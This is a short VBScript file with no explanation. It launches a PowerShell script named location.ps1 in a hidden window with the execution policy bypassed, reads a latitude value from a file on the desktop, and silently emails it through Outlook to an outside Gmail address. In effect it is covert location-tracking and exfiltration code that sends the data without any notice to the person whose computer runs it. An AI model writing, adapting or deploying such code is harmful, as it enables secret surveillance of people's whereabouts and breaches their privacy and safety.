set objOutlook = CreateObject("Outlook.Application")
set objNamespace = objOutlook.GetNamespace("MAPI")
set objAccounts = objNamespace.Accounts

' Create WScript.Shell object
Set objShell = CreateObject("WScript.Shell")

' Execute PowerShell script
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File location.ps1", 0, True

' Get latitude and longitude from C:\file.txt
Set objFSO = CreateObject("Scripting.FileSystemObject")
' get location of desktop
strDesktop = objShell.SpecialFolders("Desktop")
' get location of file
strFile = strDesktop & "\file.txt"

Set objFile = objFSO.OpenTextFile(strFile, 1)
strLatitude = objFile.ReadLine
objFile.Close

' Send email
set objMail = objOutlook.CreateItem(0)
objMail.To = "degueydonm@gmail.com"
objMail.Subject = "Test"
objMail.Body = "Latitude : " & strLatitude
objMail.Send

set objAccounts = Nothing
set objNamespace = Nothing
set objOutlook = Nothing
set objMail = Nothing
